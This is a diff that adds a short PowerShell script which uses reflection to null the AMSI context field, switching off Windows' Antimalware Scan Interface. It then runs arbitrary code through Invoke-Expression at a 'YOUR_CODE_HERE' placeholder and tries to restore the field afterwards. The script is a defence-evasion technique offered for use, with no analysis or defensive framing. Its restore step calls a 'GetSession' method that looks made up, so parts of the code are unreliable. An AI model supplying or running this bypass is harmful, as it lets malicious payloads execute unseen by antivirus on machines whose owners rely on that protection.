@@ -1,0 +1,18 @@
+# Use reflection to get a reference to the AMSI interface
+$amsi = [Reflection.Assembly]::LoadWithPartialName("System.Management.Automation")
+    .GetType("System.Management.Automation.AmsiUtils")
+
+# Use reflection to get a reference to the AMSI scan function
+$scanMethod = $amsi.GetMethod("GetSession", "NonPublic, Static")
+
+# Use reflection to get a reference to the AMSI context variable
+$amsiContextField = $amsi.GetField("amsiContext", "NonPublic, Static")
+
+# Set the AMSI context variable to null, effectively disabling AMSI
+$amsiContextField.SetValue($null, $null)
+
+# Execute the desired code here
+Invoke-Expression "YOUR_CODE_HERE"
+
+# Reset the AMSI context variable to its original value
+$amsiContextField.SetValue($null, $scanMethod.Invoke($null, [Type[]] @()))
